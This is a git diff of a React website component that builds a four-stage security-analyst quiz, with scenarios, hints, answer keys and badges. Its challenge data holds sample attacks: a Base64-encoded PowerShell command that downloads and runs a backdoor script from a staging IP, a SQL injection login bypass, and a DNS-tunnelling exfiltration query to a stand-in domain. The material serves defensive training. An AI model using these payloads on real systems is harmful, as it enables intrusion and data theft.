@@ -226,20 +226,78 @@ const FadeInSection = ({ children, delay = 0, direction = "up" }) => {
 
 // --- HOMEPAGE SPECIFIC COMPONENTS ---
 
+
+const CHALLENGES = [
+  {
+    id: 1,
+    title: "SOC Scenario: Suspicious Spawn",
+    scenario: "An endpoint triggered an EDR alert for an obfuscated PowerShell execution.",
+    type: "SYSMON EVENT ID: 1 - PROCESS CREATION",
+    header: "profile_executive_summary.sh",
+    obfuscatedCode: "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTcyLjE2LjEwLjUwL2JhY2tkb29yLnBzMScp",
+    objective: "De-obfuscate the payload and identify the external C2 IP Address acting as the staging server.",
+    hint: "The '-Enc' flag indicates Base64. Try decoding the payload to extract the IP!",
+    answer: "172.16.10.50",
+    badge: "MALWARE_ANALYST_AWARDED",
+    successMsg: "Excellent de-obfuscation. The staging server IP has been blacklisted on the perimeter."
+  },
+  {
+    id: 2,
+    title: "SOC Scenario: Web Intrusion",
+    scenario: "Web server logs show a series of suspicious GET requests targeting the database.",
+    type: "HTTP ACCESS LOG - 403 FORBIDDEN",
+    header: "apache_access_log.log",
+    obfuscatedCode: "192.168.1.45 - - [15/Apr/2026:14:22:01] \"GET /login?id=1' OR '1'='1'-- HTTP/1.1\" 200 542",
+    objective: "Identify the technical name for this specific injection technique used by the attacker.",
+    hint: "Look at the 'id=' parameter. It attempts to bypass authentication using logical operators.",
+    answer: "SQL Injection",
+    badge: "WEB_DEFENDER_CERTIFIED",
+    successMsg: "Correct. SQL Injection was identified. Patching parameterized queries immediately."
+  },
+  {
+    id: 3,
+    title: "SOC Scenario: Exfiltration Attempt",
+    scenario: "Network telemetry detected high-frequency DNS queries to a suspicious sub-domain.",
+    type: "DNS QUERY LOG - TUNNELING DETECTED",
+    header: "bind9_query.log",
+    obfuscatedCode: "Query: a2V5LWxvZ2dlci1kYXRh.exfiltrate.badactor.com",
+    objective: "Extract the hidden identifier by decoding the first segment of the suspicious sub-domain.",
+    hint: "The sub-domain segment 'a2V5LWxvZ2dlci1kYXRh' is encoded in Base64.",
+    answer: "key-logger-data",
+    badge: "NETWORK_FORENSIC_EXPERT",
+    successMsg: "Great catch. Data exfiltration via DNS tunneling has been blocked."
+  },
+  {
+    id: 4,
+    title: "SOC Scenario: Ransomware Attribution",
+    scenario: "A compromised workstation shows a binary signature in the memory dump.",
+    type: "PE HEADER ANALYSIS - MALWARE ID",
+    header: "volatility_memdump.raw",
+    obfuscatedCode: "[FILE_ID: 12af89] -> SIGNATURE: LOCKBIT_3_0_ZEUS_VARIANT",
+    objective: "Enter the name of the ransomware group associated with this specific file identifier.",
+    hint: "The signature explicitly mentions the name of a notorious RaaS group.",
+    answer: "LockBit",
+    badge: "THREAT_INTEL_GURU",
+    successMsg: "Attribution complete. This is LockBit 3.0. Deploying specific decryptors."
+  }
+];
+
 const InteractiveTerminal = () => {
+  const [currentIdx, setCurrentIdx] = useState(0);
   const [input, setInput] = useState('');
   const [status, setStatus] = useState('idle');
   const [showHint, setShowHint] = useState(false);
+  const [isCompleted, setIsCompleted] = useState(false);
   
-  const obfuscatedCmd = "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTcyLjE2LjEwLjUwL2JhY2tkb29yLnBzMScp"; 
+  const current = CHALLENGES[currentIdx];
 
-  const handleDecrypt = (e) => {
+  const handleAnswer = (e) => {
     e.preventDefault();
     if (!input) return;
     
     setStatus('checking');
     setTimeout(() => {
-      if (input.trim() === "172.16.10.50") {
+      if (input.trim().toLowerCase() === current.answer.toLowerCase()) {
         setStatus('success');
       } else {
         setStatus('error');
@@ -248,68 +306,121 @@ const InteractiveTerminal = () => {
     }, 1200);
   };
 
+  const nextChallenge = () => {
+    if (currentIdx < CHALLENGES.length - 1) {
+      setCurrentIdx(prev => prev + 1);
+      setInput('');
+      setStatus('idle');
+      setShowHint(false);
+    } else {
+      setIsCompleted(true);
+    }
+  };
+
   return (
     <TiltCard>
       <div 
-        className="bg-slate-100/80 dark:bg-[#050810]/80 backdrop-blur-2xl border border-red-500/10 rounded-3xl p-8 md:p-12 shadow-[0_0_50px_rgba(0,0,0,0.5)] hover:shadow-[0_0_60px_rgba(239,68,68,0.15)] relative overflow-hidden group transition-all duration-700 h-full w-full"
+        className="bg-slate-100/80 dark:bg-[#050810]/80 backdrop-blur-2xl border border-blue-500/10 rounded-3xl p-8 md:p-12 shadow-[0_0_50px_rgba(0,0,0,0.5)] hover:shadow-[0_0_60px_rgba(59,130,246,0.15)] relative overflow-hidden group transition-all duration-700 h-full w-full"
       >
-        <div className="absolute top-0 right-0 w-64 h-64 bg-red-500/10 rounded-full blur-[80px] pointer-events-none group-hover:bg-red-500/20 transition-all duration-700"></div>
+        <div className="absolute top-0 right-0 w-64 h-64 bg-blue-500/10 rounded-full blur-[80px] pointer-events-none group-hover:bg-blue-500/20 transition-all duration-700"></div>
         
-        <div className="flex items-center gap-4 mb-8 relative z-10">
-          <motion.div 
-            animate={{ rotate: [0, 5, -5, 0] }}
-            transition={{ duration: 0.5, repeat: Infinity, repeatDelay: 5 }}
-            className="p-3 bg-red-500/10 border border-red-500/30 rounded-xl"
-          >
-            <ShieldAlert className="w-6 h-6 text-red-400" />
-          </motion.div>
-          <div>
-            <h3 className="text-2xl font-bold text-slate-900 dark:text-white tracking-tight">SOC Scenario: Suspicious Spawn</h3>
-            <p className="text-slate-600 dark:text-slate-400 text-sm mt-1">An endpoint triggered an EDR alert for an obfuscated PowerShell execution.</p>
+        <div className="flex items-center justify-between mb-8 relative z-10">
+          <div className="flex items-center gap-4">
+            <motion.div 
+              animate={{ rotate: status === 'success' ? [0, 360] : [0, 5, -5, 0] }}
+              transition={{ duration: status === 'success' ? 0.8 : 0.5, repeat: status === 'success' ? 0 : Infinity, repeatDelay: 5 }}
+              className={`p-3 border rounded-xl transition-colors duration-500 ${status === 'success' ? 'bg-emerald-500/10 border-emerald-500/30' : 'bg-blue-500/10 border-blue-500/30'}`}
+            >
+              {status === 'success' ? <ShieldCheck className="w-6 h-6 text-emerald-400" /> : <ShieldAlert className="w-6 h-6 text-blue-400" />}
+            </motion.div>
+            <div>
+              <h3 className="text-2xl font-bold text-slate-900 dark:text-white tracking-tight">{isCompleted ? "Cyber Quest Complete" : current.title}</h3>
+              <p className="text-slate-600 dark:text-slate-400 text-sm mt-1">{isCompleted ? "All threats neutralized. Access restored." : current.scenario}</p>
+            </div>
           </div>
+          {!isCompleted && (
+            <div className="text-[10px] font-bold tracking-widest text-slate-500 uppercase bg-slate-200/50 dark:bg-white/5 px-3 py-1.5 rounded-full border border-slate-200 dark:border-white/10 shrink-0">
+              Stage {current.id} / {CHALLENGES.length}
+            </div>
+          )}
         </div>
 
         <AnimatePresence mode="wait">
-          {status === 'success' ? (
+          {isCompleted ? (
+            <motion.div 
+              key="completed"
+              initial={{ opacity: 0, y: 20 }}
+              animate={{ opacity: 1, y: 0 }}
+              className="bg-emerald-500/10 border border-emerald-500/30 rounded-2xl p-12 text-center relative z-10"
+            >
+              <motion.div 
+                animate={{ scale: [1, 1.1, 1] }} 
+                transition={{ repeat: Infinity, duration: 3 }}
+                className="w-20 h-20 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto mb-6 border border-emerald-500/40"
+              >
+                <Award className="w-10 h-10 text-emerald-400" />
+              </motion.div>
+              <h4 className="text-3xl font-extrabold text-emerald-700 dark:text-emerald-300 mb-4 tracking-tight">System Fully Hardened</h4>
+              <p className="text-emerald-400/80 mb-8 max-w-md mx-auto">
+                You've successfully identified and mitigated every threat in this simulation. 
+                Your pattern recognition and forensic skills are elite.
+              </p>
+              <motion.button
+                whileHover={{ scale: 1.05 }}
+                whileTap={{ scale: 0.95 }}
+                onClick={() => {
+                  setCurrentIdx(0);
+                  setIsCompleted(false);
+                  setStatus('idle');
+                  setInput('');
+                }}
+                className="px-8 py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl font-bold tracking-widest uppercase text-xs transition-all shadow-lg"
+              >
+                Reset Simulation
+              </motion.button>
+            </motion.div>
+          ) : status === 'success' ? (
             <motion.div 
               key="success"
               initial={{ opacity: 0, scale: 0.95 }}
               animate={{ opacity: 1, scale: 1 }}
+              exit={{ opacity: 0, scale: 1.05 }}
               className="bg-emerald-500/10 border border-emerald-500/30 rounded-2xl p-8 text-center relative z-10"
             >
               <motion.div animate={{ y: [0, -10, 0] }} transition={{ repeat: Infinity, duration: 2 }}>
                 <Unlock className="w-12 h-12 text-emerald-400 mx-auto mb-4" />
               </motion.div>
               <h4 className="text-2xl font-bold text-emerald-700 dark:text-emerald-300 mb-2">Threat Neutralized</h4>
-              <p className="text-emerald-400/80 mb-6">Excellent de-obfuscation. The staging server IP has been blacklisted on the perimeter.</p>
-              <motion.div 
-                initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}
-                className="inline-flex items-center gap-2 px-4 py-2 bg-emerald-500/20 rounded-lg border border-emerald-500/30 text-emerald-200 text-sm font-mono"
-              >
-                Badge: MALWARE_ANALYST_AWARDED
-              </motion.div>
+              <p className="text-emerald-400/80 mb-6">{current.successMsg}</p>
+              <div className="flex flex-col md:flex-row items-center justify-center gap-4">
+                <div className="inline-flex items-center gap-2 px-4 py-2 bg-emerald-500/20 rounded-lg border border-emerald-500/30 text-emerald-200 text-[10px] font-mono tracking-widest">
+                  Badge: {current.badge}
+                </div>
+                <motion.button
+                  whileHover={{ x: 5 }}
+                  onClick={nextChallenge}
+                  className="px-6 py-2.5 bg-white dark:bg-emerald-600 text-slate-900 dark:text-white rounded-lg font-bold text-xs tracking-widest uppercase flex items-center gap-2 shadow-lg"
+                >
+                  {currentIdx < CHALLENGES.length - 1 ? "Next Challenge" : "Finalize Protocol"} <ChevronRight className="w-4 h-4" />
+                </motion.button>
+              </div>
             </motion.div>
           ) : (
             <motion.div key="form" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="space-y-6 relative z-10">
               <div className="bg-white dark:bg-[#0A0F1C] border border-slate-200 dark:border-white/[0.05] rounded-xl p-5 font-mono text-sm text-slate-700 dark:text-slate-300 shadow-inner">
-                <div className="text-red-400 mb-3 flex items-center gap-2"><Activity className="w-4 h-4"/> [SYSMON EVENT ID: 1 - PROCESS CREATION]</div>
-                <div className="text-slate-500 mb-4 whitespace-nowrap overflow-hidden text-ellipsis">
-                  <span className="text-blue-400/80">ParentImage:</span> C:\Windows\System32\cmd.exe<br/>
-                  <span className="text-blue-400/80">Image:</span> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe<br/>
-                  <span className="text-blue-400/80">CommandLine:</span> powershell.exe -NoP -NonI -W Hidden -Enc
-                </div>
+                <div className="text-blue-500 dark:text-blue-400 mb-3 flex items-center gap-2"><Activity className="w-4 h-4"/> [{current.type}]</div>
                 
                 <div className="flex flex-col gap-2 bg-[#0A0F1C]/[0.02] dark:bg-white/[0.02] p-4 rounded-lg border border-slate-200 dark:border-white/[0.05] overflow-x-auto">
-                  <span className="text-slate-500 text-xs">Encoded Payload Segment:</span>
-                  <span className="text-violet-400 font-bold select-all tracking-wider text-xs md:text-sm">{obfuscatedCmd}</span>
+                  <span className="text-slate-500 text-xs">Analysis Snippet:</span>
+                  <span className="text-violet-400 font-bold select-all tracking-wider text-xs md:text-sm whitespace-pre-wrap">{current.obfuscatedCode}</span>
                 </div>
                 
                 <div className="text-slate-700 dark:text-slate-300 mt-5 font-bold flex flex-col gap-3">
-                  <div>Objective: <span className="font-normal opacity-80">De-obfuscate the payload and identify the external C2 IP Address acting as the staging server.</span></div>
+                  <div>Objective: <span className="font-normal opacity-80">{current.objective}</span></div>
                   
                   {showHint ? (
-                    <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }} className="text-xs text-amber-400 font-mono mt-1 border-l-2 border-amber-500/50 pl-3 py-1 overflow-hidden">
-                      [System Hint]: The '-Enc' flag indicates Base64. Try using CyberChef or 'echo [payload] | base64 -d' to decode the text and extract the IP!
+                    <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }} className="text-xs text-amber-500 font-mono mt-1 border-l-2 border-amber-500/50 pl-3 py-1 overflow-hidden">
+                      [System Hint]: {current.hint}
                     </motion.div>
                   ) : (
                     <button 
@@ -323,15 +434,15 @@ const InteractiveTerminal = () => {
                 </div>
               </div>
 
-              <form onSubmit={handleDecrypt} className="flex flex-col md:flex-row gap-4">
+              <form onSubmit={handleAnswer} className="flex flex-col md:flex-row gap-4">
                 <div className="relative flex-grow">
-                  <Crosshair className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-500" />
+                  <TerminalSquare className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-500" />
                   <input 
                     type="text" 
                     value={input}
                     onChange={(e) => setInput(e.target.value)}
-                    placeholder="Enter the extracted Malicious IP (e.g. x.x.x.x)..." 
-                    className="w-full bg-[#0A0F1C]/[0.02] dark:bg-white/[0.03] border border-slate-300 dark:border-white/[0.1] focus:border-red-500/50 rounded-xl py-3.5 pl-12 pr-4 text-slate-900 dark:text-white font-mono text-sm outline-none transition-all placeholder:text-slate-600 focus:bg-[#0A0F1C]/[0.02] dark:bg-white/[0.05] shadow-inner"
+                    placeholder="Enter identifying string..." 
+                    className="w-full bg-[#0A0F1C]/[0.02] dark:bg-white/[0.03] border border-slate-300 dark:border-white/[0.1] focus:border-blue-500/50 rounded-xl py-3.5 pl-12 pr-4 text-slate-900 dark:text-white font-mono text-sm outline-none transition-all placeholder:text-slate-600 focus:bg-[#0A0F1C]/[0.02] dark:bg-white/[0.05] shadow-inner"
                     disabled={status === 'checking'}
                   />
                 </div>
@@ -344,16 +455,16 @@ const InteractiveTerminal = () => {
                       ? 'bg-blue-500/20 text-blue-600 dark:text-blue-300 border border-blue-500/30 cursor-wait'
                       : status === 'error'
                       ? 'bg-red-500/20 text-red-300 border border-red-500/30'
-                      : 'bg-red-600 hover:bg-red-500 text-slate-900 dark:text-white shadow-[0_0_20px_rgba(220,38,38,0.4)] hover:shadow-[0_0_30px_rgba(239,68,68,0.6)] relative overflow-hidden group/btn'
+                      : 'bg-blue-600 hover:bg-blue-500 text-white shadow-[0_0_20px_rgba(37,99,235,0.4)] hover:shadow-[0_0_30px_rgba(59,130,246,0.6)] relative overflow-hidden group/btn'
                   }`}
                 >
                   <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/[0.2] to-transparent -translate-x-full group-hover/btn:animate-[shimmer_1.5s_infinite]"></div>
                   {status === 'checking' ? (
                     <><Activity className="w-4 h-4 animate-spin" /> Analyzing...</>
                   ) : status === 'error' ? (
-                    <><motion.div animate={{ x: [-5, 5, -5, 5, 0] }} transition={{ duration: 0.4 }}><XCircle className="w-4 h-4" /></motion.div> IP Not Found</>
+                    <><motion.div animate={{ x: [-5, 5, -5, 5, 0] }} transition={{ duration: 0.4 }}><XCircle className="w-4 h-4" /></motion.div> Failed</>
                   ) : (
-                    <><CheckCircle2 className="w-4 h-4 relative z-10" /> <span className="relative z-10">Submit IOC</span></>
+                    <><CheckCircle2 className="w-4 h-4 relative z-10" /> <span className="relative z-10">Submit SOC Intel</span></>
                   )}
                 </motion.button>
               </form>
@@ -364,6 +475,7 @@ const InteractiveTerminal = () => {
     </TiltCard>
   );
 };
+
 
 const SectionHeading = ({ title, icon: Icon }) => (
   <div className="flex items-center gap-4 mb-16 group">
